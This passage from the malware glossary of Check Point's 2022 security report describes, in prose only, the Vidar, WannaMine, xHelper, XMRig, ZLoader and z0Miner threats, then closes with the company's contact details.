Vidar is an infostealer that targets Windows operating systems. First detected at the 
end of 2018, it is designed to steal passwords, credit card data and other sensitive 
information from various web browsers and digital wallets. Vidar is sold on various 
online forums and used as a malware dropper to download GandCrab ransomware 
as its secondary payload.WannaMine 
WannaMine is a sophisticated Monero cryptomining worm that spreads the 
EternalBlue exploit. WannaMine implements a spreading mechanism and 
persistence techniques by leveraging the Windows Management Instrumentation 
(WMI) permanent event subscriptions.73CHECK POINT SOFTWARE\|SECURITY REPORT 2022xHelper
xHelper is an Android malware which mainly shows intrusive pop\-up ads and 
notification spam. It is very hard to remove once installed due to its reinstallation 
capabilities. First observed in March 2019, xHelper has now infected more than 
45,000 devices.XMRig
XMRig is open\-source CPU mining software used to mine the Monero 
cryptocurrency. Threat actors often abuse this open\-source software by integrating 
it into their malware to conduct illegal mining on victims devices.ZLoader 
ZLoader is a banking malware which uses webinjects to steal credentials and private 
information, and can extract passwords and cookies from the victims web browser. 
It downloads VNC that allows the threat actors to connect to the victims system and 
perform financial transactions from the users device. First seen in 2016, the Trojan 
is based on leaked code of the Zeus malware from 2011\. In 2020, the malware is very 
popular among threat actors and includes many new variants.z0Miner 
Z0Miner, first observed in November 2020 is a cryptominer which was found on 
thousands of servers exploited by Oracles WebLogic Server Remote Code Execution 
flaw. The group behind Z0miner has since been taking advantage of the Atlassian 
Confluence RCE vulnerability (CVE\-2021\-26084\), to infect additional servers.74CHECK POINT SOFTWARE\|SECURITY REPORT 2022CONTACT USWORLDWIDE HEADQUARTERS5 HaSolelim Street, Tel Aviv 67897, Israel 
Tel: 972\-3\-753\-4555 \| Fax: 972\-3\-624\-1100 
Email: info@checkpoint.comU.S. HEADQUARTERS959 Skyway Road, Suite 300, San Carlos, CA 94070 
Tel: 800\-429\-4391 \| 650\-628\-2000 \| Fax: 650\-654\-4233UNDER ATTACK?Contact our Incident Response Team: 
emergency\-response@checkpoint.comCHECK POINT RESEARCH PODCAST
Tune in to cp to get CPRs latest research,
plus behind the scenes and other exclusive content. 
Visit us at https:research.checkpoint.comcategorycpradioW WW . CHECKPOINT . COM 1994\-2022 Check Point Software Technologies Ltd. All Rights Reserved.